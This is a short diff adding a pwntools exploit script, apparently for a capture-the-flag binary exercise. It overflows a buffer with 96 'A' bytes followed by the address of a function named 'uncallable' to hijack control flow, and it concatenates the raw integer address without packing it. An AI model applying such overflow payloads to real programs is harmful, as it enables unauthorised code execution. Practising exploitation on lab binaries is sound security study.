@@ -1,0 +1,17 @@
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# input byte values not ascii
+e = ELF(exe)
+# check format of address, MUST BE BYTES
+uncallable_addr = e.symbols['uncallable']
+print(uncallable_addr)
+
+k = 96
+response = b'A' * k + uncallable_addr
+
+r = start()
+r.recvline()
+r.sendline(response) 
+print(r.recvall())
+
